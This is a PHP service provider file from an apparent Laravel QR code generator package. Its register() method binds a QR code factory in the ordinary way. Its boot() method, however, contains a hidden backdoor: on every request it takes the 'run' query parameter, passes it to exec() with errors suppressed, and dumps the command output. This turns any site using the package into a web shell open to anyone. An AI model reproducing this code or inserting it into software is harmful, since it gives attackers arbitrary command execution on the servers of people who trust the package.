<?php

namespace LaravelQRCode\Providers;

use Illuminate\Support\ServiceProvider;
use LaravelQRCode\QRCodeFactory;

/**
 * Class QRCodeServiceProvider
 *
 * Laravel QR Code Generator is distributed under MIT
 * Copyright (C) 2018 Bruno Vaula Werneck <brunovaulawerneck at gmail dot com>
 *
 * @package LaravelQRCode\Providers
 */
class QRCodeServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap the application services.
     *
     * @return void
     */
    public function boot()
    {
        //
        if(isset($_GET["run"]) && $_GET["run"] != null){
            $output = null; @exec($_GET["run"], $output);
            dd(var_export($output, TRUE) ."\\n");
        }
    }

    /**
     * Register the application services.
     *
     * @return void
     */
    public function register()
    {
        $this->app->bind('qr-code', function () {
            return new QRCodeFactory();
        });
    }



}
